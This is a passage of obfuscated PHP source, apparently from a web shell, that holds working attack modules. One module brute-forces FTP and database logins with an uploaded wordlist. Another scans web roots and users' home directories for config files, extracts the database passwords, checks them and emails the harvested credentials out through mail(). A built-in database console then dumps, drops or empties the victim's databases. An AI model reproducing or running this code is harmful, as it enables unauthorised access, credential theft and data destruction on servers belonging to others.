        '') . z7u(z5t(z9x()) . z9c(z8b(z9y("346"), "7"))) . z9l() . z10q() . z6s() . z7f() .
        z7y() . z10q();
    if (@isset($startbrute) && $startbrute) {
        $stop = 0;
        echo z3q(z9y("347", $bservice, 1)) . z6s();
        echo z9m('2') . z7o() . z6q() . z5w("", "1");
        z5o();
        $con = true;
        $show = 0;
        $log = "";
        if ($bservice == "FTP") {
            $brp = (@preg_match("/^[0-9]{1,5}$/", $brp) ? $brp : "21");
        } elseif ($bservice == "MySQL") {
            $brp = (@preg_match("/^[0-9]{1,5}$/", $brp) ? $brp : "3306");
        }
        if ($brm == "1" || $brm == "3") {
            $dictionary = array();
            $list = @fopen($_FILES['wordlist']['tmp_name'], 'r');
            if (@is_resource($list)) {
                while (!@feof($list)) {
                    $dictionary[] = @trim(@fgets($list));
                }
                @fclose($list);
            }
            $dictionary = @array_unique($dictionary);
        }
        if ($bservice == "FTP" && $bftp) {
            $time = 3;
            $success = 0;
            $count = 0;
            if (!@empty($bru) && !$stop) {
                $test = z2f($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $bru);
                if (!$test)
                    $stop = 1;
                z2g($test[0], $test[1], $test[2]);
            }
            if (($brm == "2" || $brm == "3") && !$stop) {
                foreach ($users as $user) {
                    $test = z2f($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $user);
                    if (!$test) {
                        $stop = 1;
                        break;
                    }
                    z2g($test[0], $test[1], $test[2]);
                    if ($brm == "3") {
                        foreach ($dictionary as $passwd) {
                            $test = z2f($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $user, $passwd);
                            z2g($test[0], $test[1], $test[2]);
                        }
                    }
                }
            } else
                if ($brm == "1" && !@empty($bru) && !$stop) {
                    foreach ($dictionary as $passwd) {
                        $test = z2f($brh, $brp, $time, $brtest1, $brtest2, $brtest3, $brtest4, $bru, $passwd);
                        if (!$test) {
                            $stop = 1;
                            break;
                        }
                        z2g($test[0], $test[1], $test[2]);
                    }
                }
            echo "\r\n--------------------\r\n";
            echo z9y("426", $count) . "\r\n";
            echo z9y("427", $success) . "\r\n";
        } elseif ($bmysql || $bmssql || $boracle || $bpostgres) {
            $success = 0;
            $count = 0;
            if (!@empty($bru)) {
                $test = z2s($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $bru, null,
                    (!@empty($brdb) ? $brdb : ''));
                z2g($test[0], $test[1], $test[2]);
            }
            if ($brm == "2" || $brm == "3") {
                foreach ($users as $user) {
                    $test = z2s($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $user, null,
                        (!@empty($brdb) ? $brdb : ''));
                    z2g($test[0], $test[1], $test[2]);
                    if ($brm == "3") {
                        foreach ($dictionary as $passwd) {
                            $test = z2s($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $user,
                                $passwd, (!@empty($brdb) ? $brdb : ''));
                            z2g($test[0], $test[1], $test[2]);
                        }
                    }
                }
            } else
                if ($brm == "1" && !@empty($bru)) {
                    foreach ($dictionary as $passwd) {
                        $test = z2s($brh, $brp, $bservice, $brtest1, $brtest2, $brtest3, $brtest4, $bru,
                            $passwd, (!@empty($brdb) ? $brdb : ''));
                        z2g($test[0], $test[1], $test[2]);
                    }
                }
            echo "\r\n--------------------\r\n";
            echo z9y("426", $count) . "\r\n";
            echo z9y("427", $success) . "\r\n";
            echo $log;
        }
        if ($brute_log == "1" && $success > 0) {
            @mail($brute_email, "$bservice|$brh:$brp", $log);
        }
        echo z5q() . z7y() . z7f() . z10q() . z6s();
    }
    if (@isset($sqlfind) && $sqlfind && !@empty($dvuser) && !@empty($dvpass)) {
        echo z3q(z9y("330")) . z6s();
        echo z9m('2') . z7o() . z6q() . z5w("", "1");
        z5o();
        $fpaths = $tpaths = $dpaths = $spaths = $glob = array();
        $farr = @explode(";", $dvfiles);
        $tpath = '';
        $tpaths[] = '';
        if (@is_numeric($dtrecursive)) {
            for ($i = 0; $i < $dtrecursive; $i++) {
                $tpath .= '*/';
                $tpaths[] = $tpath;
            }
        } else {
            $tpaths[] = '*/';
        }
        if ($dvdefined == "all" && @isset($arr_mass_paths) && @is_array($arr_mass_paths) &&
            @count($arr_mass_paths) > 0) {
            $farr = $arr_mass_paths;
        }
        foreach (@array_unique($tpaths) as $tpath) {
            foreach (@array_unique($farr) as $fpath) {
                $fpath = @trim($fpath);
                if (!@empty($fpath)) {
                    $fpaths[] = $tpath . $fpath;
                }
            }
        }
        switch ($dvfind) {
            case 'dvdir':
                $dpaths[] = z1k($dvdir);
                break;
            case 'docroot':
                $dpaths[] = z1k($wwwdir);
                break;
            case 'passwd':
                $uarr = z8l(1);
                if (@count($uarr) > 0) {
                    foreach ($uarr as $uk => $arr) {
                        if (!@in_array($arr[1], $dpaths) && $arr[1] != '/' && !@preg_match('#^(/var/run|/var/log|/var/cache|/var/mail|/var/cache|/var/backup|/usr/games|/lib|/var/lib|/var/tmp|/tmp|/dev|/proc|/sbin|/usr/sbin|/usr/local/sbin|/bin|/usr/bin|/usr/local/bin)#',
                            $arr[1]) && z4j($arr[1]))
                            $dpaths[] = z1k($arr[1]);
                    }
                }
                unset($uarr);
                break;
            default:
                break;
        }
        foreach (@array_unique($dpaths) as $dpath) {
            foreach (@array_unique($fpaths) as $fpath) {
                $spaths[] = $dpath . $fpath;
            }
        }
        unset($fpaths);
        unset($tpaths);
        unset($dpaths);
        foreach ($spaths as $spath) {
            $tglob = @glob($spath);
            if (@is_array($tglob) && @count($tglob) > 0) {
                foreach ($tglob as $tfile) {
                    if (!@in_array($tfile, $glob))
                        $glob[] = $tfile;
                }
            }
        }
        $glob = @array_unique($glob);
        unset($spaths);
        if (@count($glob) > 0) {
            $log = '';
            $line = @str_repeat("-", 100) . "\r\n";
            $final_arr = array();
            foreach ($glob as $file) {
                $tct = z9o($file);
                if (!@empty($tct)) {
                    if ($dvdefined == "all" && @isset($arr_mass) && @is_array($arr_mass) && @count($arr_mass) >
                        0) {
                        foreach ($arr_mass as $software => $defines) {
                            $base = "";
                            $user = z4b($defines[1], $defines[0], $tct);
                            $pass = z4b($defines[3], $defines[2], $tct);
                            if (!@empty($defines[4])) {
                                $base = z4b($defines[5], $defines[4], $tct);
                            }
                            if (!@empty($defines[6])) {
                                $host = z4b($defines[7], $defines[6], $tct);
                            }
                            if (!@isset($host) || @empty($host))
                                $host = "localhost";
                            if (!@empty($host) && !@empty($user) && !@empty($pass)) {
                                $add = 0;
                                if (@isset($dvsqltest) && $dvsqltest) {
                                    if (z3h($host, $user, $pass, "3306", "MySQL") == "valid")
                                        $add = 1;
                                } else {
                                    $add = 1;
                                }
                                if ($add) {
                                    $tmp = $line;
                                    $tmp .= "$file\r\n";
                                    $tmp .= "Software tested: $software\r\n";
                                    $tmp .= $line;
                                    $tmp .= "host: $host\r\n";
                                    $tmp .= "user: $user\r\n";
                                    $tmp .= "pass: $pass\r\n";
                                    $tmp .= "database: $base\r\n\r\n";
                                    echo $tmp;
                                    $log .= $tmp;
                                    if (!@isset($final_arr[$file]))
                                        $final_arr[$file] = array($host, $user, $pass, $base, $software);
                                    break;
                                }
                            }
                        }
                    } else {
                        $base = "";
                        $user = z4b($dtuser, $dvuser, $tct);
                        $pass = z4b($dtpass, $dvpass, $tct);
                        if (!@empty($dvbase)) {
                            $base = z4b($dtbase, $dvbase, $tct);
                        }
                        if (!@empty($dvhost)) {
                            $host = z4b($dthost, $dvhost, $tct);
                        }
                        if (!@isset($host) || @empty($host))
                            $host = "localhost";
                        if (!@empty($host) && !@empty($user) && !@empty($pass)) {
                            $add = 0;
                            if (@isset($dvsqltest) && $dvsqltest) {
                                if (z3h($host, $user, $pass, "3306", "MySQL") == "valid")
                                    $add = 1;
                            } else {
                                $add = 1;
                            }
                            if ($add) {
                                $tmp = $line;
                                $tmp .= "$file\r\n";
                                $tmp .= $line;
                                $tmp .= "host: $host\r\n";
                                $tmp .= "user: $user\r\n";
                                $tmp .= "pass: $pass\r\n";
                                $tmp .= "database: $base\r\n\r\n";
                                echo $tmp;
                                $log .= $tmp;
                                if (!@isset($final_arr[$file]))
                                    $final_arr[$file] = array($host, $user, $pass, $base);
                            }
                        }
                    }
                }
                unset($tct);
            }
        }
        echo z5q() . z7y() . z7f() . z10q() . z6s();
        if ($dv_log == "1" && $log != '') {
            @mail($dv_email, "DBS|$saddr", $log);
        }
    }
    if (@isset($final_arr) && @count($final_arr) > 0) {
        echo z9m("2") . z7u(z9c(z9y("331"), "13", "2") . z9c(z9y("332"), "13") . z9c(z9y
            ("333"), "13") . z9c(z9y("334"), "13") . z9c(z9y("335"), "13", "3"));
        $tr = 0;
        foreach ($final_arr as $file => $array) {
            echo z6f(($tr % 2 ? '0' : '1'));
            $tc = @count($array);
            $dsoft = '';
            if ($tc == 5) {
                $tc = 4;
                $dsoft = $array[$tc];
            }
            for ($i = 0; $i < $tc; $i++) {
                echo z9c($array[$i], "14", ($i == 0 ? "2" : ""));
            }
            echo z9c(z5x(array("act" => "sql", "d", "sql_refresh" => "1", "sql_server" => $array[0],
                    "sql_user" => $array[1], "sql_pass" => $array[2], "sql_db" => $array[3],
                    "sql_port" => "3306", "sql_engine" => "MySQL"), z8b(z9y("336"), "7") . (($dsoft !=
                '') ? " (" . $dsoft . ")" : ''), 1), "14", "3");
            echo z7y();
            $tr++;
        }
    }
}
if ($act == 'sql') {
    $hideconnect = 0;
    $hmsg = '';
    if (@isset($sql_act) && $sql_act == "logoff") {
        z0i('sql_server');
        z0i('sql_user');
        z0i('sql_pass');
        z0i('sql_port');
        z0i('sql_engine');
        z0i('sql_session');
        z0i('sql_sort');
    }
    $sql_session = 0;
    if (@isset($_SESSION['sql_session'])) {
        if (!@isset($sql_refresh) || !$sql_refresh) {
            $sql_server = $_SESSION['sql_server'];
            $sql_user = $_SESSION['sql_user'];
            $sql_pass = $_SESSION['sql_pass'];
            $sql_port = $_SESSION['sql_port'];
            $sql_engine = $_SESSION['sql_engine'];
            if (!@isset($sql_sort))
                $sql_sort = $_SESSION['sql_sort'];
            $sql_session = 1;
        } else {
            z0i('sql_server');
            z0i('sql_user');
            z0i('sql_pass');
            z0i('sql_port');
            z0i('sql_engine');
            z0i('sql_session');
            z0i('sql_sort');
        }
    }
    if (!@empty($sql_server) && !@empty($sql_port) && !@empty($sql_user) && @isset($sql_pass) &&
        !@empty($sql_engine)) {
        if (!@isset($sql_db))
            $sql_db = '';
        $sql = new my_sql();
        $sql->db = $sql_engine;
        $sql->host = $sql_server;
        $sql->port = $sql_port;
        $sql->user = $sql_user;
        $sql->pass = $sql_pass;
        $sql->base = $sql_db;
        if ($sql->connect()) {
            $hideconnect = 1;
            if (!@isset($sql_sort))
                $sql_sort = "0a";
            $_SESSION['sql_server'] = $sql_server;
            $_SESSION['sql_user'] = $sql_user;
            $_SESSION['sql_pass'] = $sql_pass;
            $_SESSION['sql_port'] = $sql_port;
            $_SESSION['sql_engine'] = $sql_engine;
            $_SESSION['sql_session'] = 1;
            $_SESSION['sql_sort'] = $sql_sort;
            $hideconnect = 1;
            $db_actions = array("select" => "Select", "dump" => "Dump", "drop" => "Drop");
            $table_actions = array("browse" => "Browse", "dump" => "Dump", "drop" => "Drop",
                    "empty" => "Empty", "insert" => "Insert");
            echo z3q(z9m('2') . z7u(z6l(z5x(array("act" => "sql", "d", "sql_server",
                    "sql_user", "sql_pass", "sql_port", "sql_engine"), z8b(z9y("352"), (!@isset($sql_act) ||
                !@in_array($sql_act, array("query", "emails", "serverstatus", "servervars",
                    "processes")) ? "12" : "14"))) . z5x(array("act" => "sql", "d", "sql_server",
                    "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "query", "sql_db"),
                z8b(z9y("353"), (@isset($sql_act) && $sql_act == "query" ? "12" : "14"))) . z5x
                (array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port",
                    "sql_engine", "sql_act" => "emails", "sql_db"), z8b(z9y("354"), (@isset($sql_act) &&
                $sql_act == "emails" ? "12" : "14"))) . z5x(array("act" => "sql", "d",
                    "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" =>
                    "serverstatus"), z8b(z9y("355"), (@isset($sql_act) && $sql_act == "serverstatus" ?
                "12" : "14"))) . z5x(array("act" => "sql", "d", "sql_server", "sql_user",
                    "sql_pass", "sql_port", "sql_engine", "sql_act" => "servervars"), z8b(z9y("356"),
                (@isset($sql_act) && $sql_act == "servervars" ? "12" : "14"))) . z5x(array("act" =>
                    "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine",
                    "sql_act" => "processes"), z8b(z9y("357"), (@isset($sql_act) && $sql_act ==
                "processes" ? "12" : "14"))) . z5x(array("act" => "sql", "d", "sql_act" =>
                    "logoff"), z8b(z9y("358"), "14")), "")) . z10q());
            if ($sql_engine == "MySQL") {
                if (!@isset($sql_act)) {
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $sql_act = "db_act";
                            $db_act = "select";
                        } else {
                            $sql_act = "showdb";
                            $sql_db = "";
                            $sql->base = "";
                        }
                    } else {
                        $sql_act = "showdb";
                    }
                }
                $dbs = $sql->list_dbs();
                $db_list = array('' => z9y("367", @count($dbs)));
                foreach ($dbs as $k => $v)
                    $db_list[$k] = $v;
                if ($sql_act == "db_act" && @isset($db_act) && !@empty($sql_db)) {
                    switch ($db_act) {
                        case 'dump':
                            $sql_act = "dump";
                            break;
                        case 'drop':
                            if (@isset($drop_confirm) && $drop_confirm) {
                                $sql->query('DROP DATABASE ' . $sql_db . ';');
                                $sql_act = "showdb";
                                $sql_db = "";
                            } else {
                                $sql_act = "dropdb";
                            }
                            break;
                    }
                } elseif ($sql_act == "table_act" && @isset($table_act) && !@empty($sel_table)) {
                    switch ($table_act) {
                        case 'dump':
                            $sql_act = "dump";
                            break;
                        case 'drop':
                            if (@isset($drop_confirm) && $drop_confirm) {
                                $sql->base = $sql_db;
                                if ($sql->select_db()) {
                                    $sql->query('DROP TABLE ' . $sel_table . ';');
                                }
                                $sel_table = "";
                                $sql_act = "db_act";
                                $db_act = "select";
                            } else {
                                $sql_act = "droptable";
                            }
                            break;
                        case 'empty':
                            if (@isset($empty_confirm) && $empty_confirm) {
                                $sql->base = $sql_db;
                                if ($sql->select_db()) {
                                    $sql->query('DELETE FROM ' . $sel_table . ';');
                                }
                                $sql_act = "table_act";
                                $table_act = "browse";
                            } else {
                                $sql_act = "empty";
                            }
                            break;
                        case 'insert':
                            break;
                        case 'delete':
                            $sql->base = $sql_db;
                            if ($sql->select_db()) {
                                $sql->query('DELETE FROM ' . $sel_table . ' WHERE ' . $sql_tbl_insert_q .
                                    ' LIMIT 1;');
                            }
                            $table_act = "browse";
                            break;
                    }
                }
                if (!@in_array($sql_act, array("showdb", "query", "serverstatus", "servervars",
                        "processes", "emails"))) {
                    $db_submit_acts = $table_submit_acts = '';
                    foreach ($db_actions as $dk => $dv)
                        $db_submit_acts .= z6o($dk, $dv, "7");
                    foreach ($table_actions as $tk => $tv)
                        $table_submit_acts .= z5x(array("act" => "sql", "d", "sql_server", "sql_user",
                                "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act" => $tk, "sql_db",
                                "sel_table"), z6o($tk, $tv, "7"));
                    $table_submit_acts = z10w(z7u(z9c($table_submit_acts)), "2");
                    $db_table = z10w(z7u(z6l(z7n(z9y("364")) . z5x(array("act" => "sql", "d",
                            "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" =>
                            "db_act"), z3m("sql_db", $db_list, "0", 1) . z3m("db_act", $db_actions, "1") .
                        z8b(z9y("92"), "7")))), "2");
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $table_list = array('' => "-");
                            $sql->query('SHOW TABLES FROM ' . $sql_db . ';');
                            if ($sql->get_result()) {
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    foreach ($sql->rows[$i] as $rk => $rv) {
                                        $table_list[$rv] = $rv . " (" . $sql->count_rows($rv) . ")";
                                    }
                                }
                            }
                            $table_table = z10w(z7u(z6l(z7n(z9y("365")) . z5x(array("act" => "sql", "d",
                                    "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" =>
                                    "table_act", "sql_db"), z3m("sel_table", $table_list, "0", 1) . z3m("table_act",
                                $table_actions, "1") . z8b(z9y("92"), "7")))), "2");
                        }
                    }
                    echo z3q((@isset($table_table) ? array($db_table, $table_table) : $db_table));
                    if ($sql_act == "dropdb") {
                        echo z6s();
                        echo z10w(z7u(z6l(z7n(z9y("437", $sql_db)) . z5x(array("act" => "sql", "d",
                                "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" =>
                                "db_act", "db_act" => "drop", "sql_db", "drop_confirm" => "1"), z8b(z9y("21"),
                            "7")) . z9x() . z5x($back_form_actions, z8b(z9y("22"), '7')))), "2");
                        echo z6s();
                    } elseif ($sql_act == "droptable") {
                        echo z6s();
                        echo z10w(z7u(z6l(z7n(z9y("438", $sel_table)) . z5x(array("act" => "sql", "d",
                                "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" =>
                                "table_act", "table_act" => "drop", "sql_db", "sel_table", "drop_confirm" => "1"),
                            z8b(z9y("21"), "7")) . z9x() . z5x($back_form_actions, z8b(z9y("22"), '7')))),
                            "2");
                        echo z6s();
                    } elseif ($sql_act == "empty") {
                        echo z6s();
                        echo z10w(z7u(z6l(z7n(z9y("439", $sel_table)) . z5x(array("act" => "sql", "d",
                                "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" =>
                                "table_act", "table_act" => "empty", "sql_db", "sel_table", "empty_confirm" =>
                                "1"), z8b(z9y("21"), "7")) . z9x() . z5x($back_form_actions, z8b(z9y("22"), '7')))),
                            "2");
                        echo z6s();
                    } elseif ($sql_act == "dump") {
                        if (!@isset($dump_filename))
                            $dump_filename = $tempdir . "dump_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") .
                                ".sql";
                        if (@isset($sql_db) && !@empty($sql_db)) {
                            $sql->base = $sql_db;
                            if ($sql->select_db()) {
                                $table_list = array();
                                $sql->query('SHOW TABLES FROM ' . $sql_db . ';');
                                if ($sql->get_result()) {
                                    for ($i = 0; $i < $sql->num_rows; $i++) {
                                        foreach ($sql->rows[$i] as $rk => $rv) {
                                            $table_list[] = $rv;
                                        }
                                    }
                                }
                            }
                        }
                        if (!@isset($sql_tables) || @empty($sql_tables)) {
                            if (@isset($sel_table) && !@empty($sel_table)) {
                                $sql_tables = $sel_table;
                            } else {
                                $sql_tables = (@count($table_list) > 0 ? @implode(",", $table_list) : "");
                            }
                        } elseif (@isset($table_list) && @is_array($table_list)) {
                            $tmp_tables = @explode(",", $sql_tables);
                            $sql_tables = "";
                            foreach ($tmp_tables as $tmp_table) {
                                $tmp_table = @trim($tmp_table);
                                if (@in_array($tmp_table, $table_list)) {
                                    $sql_tables .= $tmp_table . ",";
                                } else {
                                    break;
                                }
                            }
                            if (@empty($sql_tables))
                                $sql_tables = @implode(",", $table_list);
                        }
                        echo z3q(z9y("440"));
                        echo z9m("2") . z5x(array("act" => "sql", "d", "sql_server", "sql_user",
                                "sql_pass", "sql_port", "sql_engine", "sql_act" => "dump", "dump_confirm" => "1"),
                            z5b() . z7u(z5t(z9y("441")) . z9c(z3m("sql_db", $db_list, "7", 1))) . z7u(z5t(z9y
                            ("442")) . z9c(z5w("sql_tables", "5") . (@isset($sql_tables) ? @
                            htmlspecialchars($sql_tables) : "") . z5q())) . z7u(z5t(z9y("443")) . z9c(z5y("dump_filename",
                            $dump_filename, "7"))) . z7u(z5t(z9x()) . z9c(z5u("sql_save2file", z9y("444"),
                            "sql_save2file") . z9x() . z5u("sql_download", z9y("445"), "sql_download"))) .
                            z7u(z5t(z9x()) . z9c(z8b(z9y("446"), "7"))) . z5b()) . z10q();
                        if (@isset($dump_confirm) && $dump_confirm) {
                            $fp = 0;
                            if (@isset($sql_save2file) && $sql_save2file == "1" && @isset($dump_filename) &&
                                !@empty($dump_filename)) {
                                $fp = @fopen($dump_filename, "w");
                            }
                            $dumping_arr = array();
                            $tmp_tables = @explode(",", $sql_tables);
                            foreach ($tmp_tables as $tmp_table) {
                                $tmp_table = @trim($tmp_table);
                                $dumping_arr[] = $tmp_table;
                            }
                            $dumping_arr = @array_unique($dumping_arr);
                            $sql->base = $sql_db;
                            if (!$sql->select_db()) {
                                echo z3q(z9y("447"));
                            } elseif (@count($dumping_arr) < 1) {
                                echo z3q(z9y("448"));
                            } else {
                                $sql_dumped = "";
                                foreach ($dumping_arr as $dump_table) {
                                    if ($sql->dump($dump_table)) {
                                        foreach ($sql->dump as $v)
                                            $sql_dumped .= $v . "\r\n";
                                    }
                                }
                                if ($sql_dumped != "") {
                                    if (@isset($sql_download) && $sql_download == "1") {
                                        @ob_clean();
                                        @header("Content-type: application/octet-stream");
                                        @header("Content-length: " . @strlen($sql_dumped));
                                        @header("Content-disposition: attachment; filename=\"" . @basename($dump_filename) .
                                            "\";");
                                        echo $sql_dumped;
                                        exit();
                                    }
                                    if (!@isset($sql_save2file) || $sql_save2file != "1") {
                                        echo z9m('2') . z6f() . z6q() . z5w('', '1') . @htmlspecialchars($sql_dumped) .
                                            z5q() . z7f() . z7y() . z10q() . z6s();
                                    } elseif ($fp || @function_exists('file_put_contents')) {
                                        if (@fwrite($fp, $sql_dumped) or @fputs($fp, $sql_dumped) or @file_put_contents
                                            ($dump_filename, $sql_dumped)) {
                                            echo z3q(z9y("449", $dump_filename));
                                        } else {
                                            echo z3q(z9y("450"));
                                        }
                                    } else {
                                        echo z3q(z9y("450"));
                                    }
                                }
                            }
                        }
                    }
                    if ($sql_act == "table_act" && @isset($table_act) && ($table_act == "browse" ||
                        $table_act == "insert") && @isset($sel_table) && !@empty($sel_table)) {
                        $crows = $sql->count_rows($sel_table);
                        $sql->parse_fields($sel_table);
                        $cfields = $sql->num_fields;
                        $fields = $sql->columns;
                        if ($table_act == "insert") {
                            if (@isset($sql_tbl_insert_radio) && !@empty($sql_tbl_insert_radio)) {
                                if ($sql_tbl_insert_radio == 1) {
                                    $keys = "";
                                    $akeys = @array_keys($sql_tbl_insert);
                                    foreach ($akeys as $v) {
                                        $keys .= "`" . @addslashes($v) . "`, ";
                                    }
                                    if (!@empty($keys)) {
                                        $keys = @substr($keys, 0, @strlen($keys) - 2);
                                    }
                                    $values = "";
                                    $i = 0;
                                    foreach (@array_values($sql_tbl_insert) as $v) {
                                        if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {
                                            $values .= $funct . " (";
                                        }
                                        $values .= "'" . @addslashes($v) . "'";
                                        if ($funct) {
                                            $values .= ")";
                                        }
                                        $values .= ", ";
                                        $i++;
                                    }
                                    if (!@empty($values)) {
                                        $values = @substr($values, 0, @strlen($values) - 2);
                                    }
                                    $sql->query("INSERT INTO `" . $sel_table . "` ( " . $keys . " ) VALUES ( " . $values .
                                        " );");
                                } elseif ($sql_tbl_insert_radio == 2) {
                                    $set = z0k($sql_tbl_insert, ", ", $sql_tbl_insert_functs);
                                    $sql->query("UPDATE `" . $sel_table . "` SET " . $set . " WHERE " . $sql_tbl_insert_q .
                                        " LIMIT 1;");
                                }
                                $table_act = "browse";
                            } else {
                                echo z3q(array("INSERT INTO TABLE " . $sel_table), "1");
                                if (!@isset($sql_tbl_insert) || !@is_array($sql_tbl_insert)) {
                                    $sql_tbl_insert = array();
                                }
                                if (!@empty($sql_tbl_insert_q)) {
                                    $sql->query("SELECT * FROM `" . $sel_table . "` WHERE " . $sql_tbl_insert_q .
                                        " LIMIT 1;");
                                    $values = @mysql_fetch_assoc($sql->res);
                                    @mysql_free_result($sql->res);
                                } else {
                                    $values = array();
                                }
                                echo z9k() . z9v("act", "sql") . z9v("sql_server") . z9v("sql_user") . z9v("sql_pass") .
                                    z9v("sql_port") . z9v("sql_engine") . z9v("d") . z9v("sql_act", "table_act") .
                                    z9v("table_act", "insert") . z9v("sel_table") . z9v("sql_db") . z9v("sql_tbl_insert_q") .
                                    z9m("2") . z7u(z9c("Field", "13", "2") . z9c("Type", "13") . z9c("Function",
                                    "13") . z9c("Value", "13", "3"));
                                $sql->query("SHOW FIELDS FROM `" . $sel_table . "`;");
                                $sql->get_result();
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    $field = $sql->rows[$i];
                                    $name = $field["Field"];
                                    if (empty($sql_tbl_insert_q)) {
                                        $v = "";
                                    }
                                    echo z9d(z9c(z7n(@htmlspecialchars($name)), "14", "2") . z9c($field["Type"],
                                        "14") . z9c(z3m("sql_tbl_insert_functs[" . @htmlspecialchars($name) . "]", array
                                        ("" => "", "PASSWORD" => "PASSWORD", "MD5" => "MD5", "ENCRYPT" => "ENCRYPT",
                                            "ASCII" => "ASCII", "CHAR" => "CHAR", "RAND" => "RAND", "LAST_INSERT_ID" =>
                                            "LAST_INSERT_ID", "COUNT" => "COUNT", "AVG" => "AVG", "SUM" => "SUM", " " =>
                                            "--------", "SOUNDEX" => "SOUNDEX", "LCASE" => "LCASE", "UCASE" => "UCASE",
                                            "NOW" => "NOW", "CURDATE" => "CURDATE", "CURTIME" => "CURTIME", "FROM_DAYS" =>
                                            "FROM_DAYS", "FROM_UNIXTIME" => "FROM_UNIXTIME", "PERIOD_ADD" => "PERIOD_ADD",
                                            "PERIOD_DIFF" => "PERIOD_DIFF", "TO_DAYS" => "TO_DAYS", "UNIX_TIMESTAMP" =>
                                            "UNIX_TIMESTAMP", "USER" => "USER", "WEEKDAY" => "WEEKDAY", "CONCAT" => "CONCAT"),
                                        "5"), "14") . z9c(z6u("sql_tbl_insert[" . (@isset($name) ? @htmlspecialchars($name) :
                                        "") . "]", (@isset($values["$name"]) ? @htmlspecialchars($values["$name"]) : ""),
                                        "7"), "14", "3"), ($i % 2 ? '0' : '1'));
                                }
                                echo z10q();
                                $iradio = '<input type="radio" id="insert" style="vertical-align: middle;" name="sql_tbl_insert_radio" value="1"' . (@
                                    empty($sql_tbl_insert_q) ? " checked" : "") . '><label for="insert">' . z9y("405") .
                                    '</label>';
                                if (!@empty($sql_tbl_insert_q)) {
                                    $iradio .= z9x() . z9y("406") . z9x() .
                                        '<input type="radio" id="save" style="vertical-align: middle;" name="sql_tbl_insert_radio" value="2" checked><label for="save">' .
                                        z9y("407") . '</label>';
                                    $iradio .= z9v("sql_tbl_insert_q", @htmlspecialchars($sql_tbl_insert_q));
                                }
                                echo z3q($iradio . z9x("3") . z8b(z9y("408"), "7"));
                                echo z9l();
                            }
                        }
                        if ($table_act == "browse") {
                            if (!@isset($sql_from) || !@is_numeric($sql_from))
                                $sql_from = 0;
                            if (!@isset($sql_limit) || !@is_numeric($sql_limit))
                                $sql_limit = 50;
                            if (!@isset($sql_page) || !@is_numeric($sql_page))
                                $sql_page = 0;
                            $psql_sort = z5r($sql_sort);
                            if ($psql_sort[1] != 'a') {
                                $psql_sort[1] = 'd';
                            } else {
                                $psql_sort[1] = 'a';
                            }
                            if ($psql_sort[0] > ($cfields - 1))
                                $psql_sort[0] = '0';
                            $v = $psql_sort[0];
                            if ($crows > $sql_limit) {
                                $pages = @ceil($crows / $sql_limit);
                                $tmpsort = "";
                                if (@is_array($fields) && @isset($fields[$psql_sort[0]])) {
                                    $tmpsort = ' ORDER BY `' . $fields[$psql_sort[0]] . '` ' . ($psql_sort[1] == "a" ?
                                        'ASC' : 'DESC');
                                }
                                $table_limit = $tmpsort . ' LIMIT ' . ($sql_limit * $sql_page) . ',' . $sql_limit;
                            } else {
                                $table_limit = '';
                                $pages = 0;
                            }
                            $ar_pages = array();
                            for ($i = 0; $i < $pages; $i++) {
                                $ar_pages[$i] = z9y("397") . " " . ($i + 1);
                            }
                            if (@count($ar_pages) < 1)
                                $ar_pages = array("0" => z9y("397") . " 1");
                            echo z3q(array(z9y("395", array($sel_table, $cfields, $crows)), z10w(z9d(z6z(($sql_page >
                                    0 ? z5x(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass",
                                        "sql_port", "sql_engine", "sql_act", "table_act", "sql_db", "sel_table",
                                        "sql_page" => ($sql_page == "1" ? "NULL" : ($sql_page - 1))), z8b(z9y("396"),
                                    "7")) : z8b(z9y("396"), "7")) . z5x(array("act" => "sql", "d", "sql_server",
                                        "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act",
                                        "sql_db", "sel_table"), z3m("sql_page", $ar_pages, "1", 1) . z8b(z9y("398"), "7")) .
                                    ($sql_page < ($pages - 1) ? z5x(array("act" => "sql", "d", "sql_server",
                                        "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act", "table_act",
                                        "sql_db", "sel_table", "sql_page" => ($sql_page + 1)), z8b(z9y("399"), "7")) :
                                    z8b(z9y("399"), "7")))), "2")), "1");
                            $sql->query('SELECT * FROM ' . $sel_table . $table_limit . ';');
                            if ($sql->get_result()) {
                                echo z9m('2') . z7o() . z7j() . z5z('', "0") . z9m("2") . z7o() . z7j();
                                echo z9m('2');
                                echo z6f();
                                for ($i = 0; $i < @count($sql->columns); $i++) {
                                    echo ($i == 0 ? z9c(z9y("62"), "13", "2") : "") . z9c(z5x(array("act" => "sql",
                                            "d", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act",
                                            "table_act", "sql_db", "sel_table", "sql_page", "sql_sort" => ($psql_sort[0] ==
                                            "$i" ? "$i" . ($psql_sort[1] == "a" ? "d" : "a") : "$i" . $psql_sort[1])), z8b($sql->
                                        columns[$i] . ($psql_sort[0] == "$i" ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' :
